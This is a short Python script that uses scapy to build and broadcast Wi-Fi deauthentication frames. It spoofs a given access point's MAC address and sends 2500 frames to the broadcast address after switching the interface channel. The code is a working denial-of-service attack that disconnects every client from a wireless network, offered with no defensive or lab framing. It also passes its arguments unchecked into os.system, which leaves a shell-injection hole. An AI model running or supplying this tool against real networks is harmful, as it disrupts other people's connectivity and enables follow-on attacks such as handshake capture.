#!/usr/bin/env python3
from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp,        # for sending packets
  conf
)
import os


def channel():
  pass



def deauth(interface, mac, ch):
       os.system(f'iwconfig {interface} channel {ch}')
       conf.verb = 0
       dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
       frame = RadioTap()/dot11/Dot11Deauth()
       sendp(frame, iface=interface, count=2500, inter=0.008)
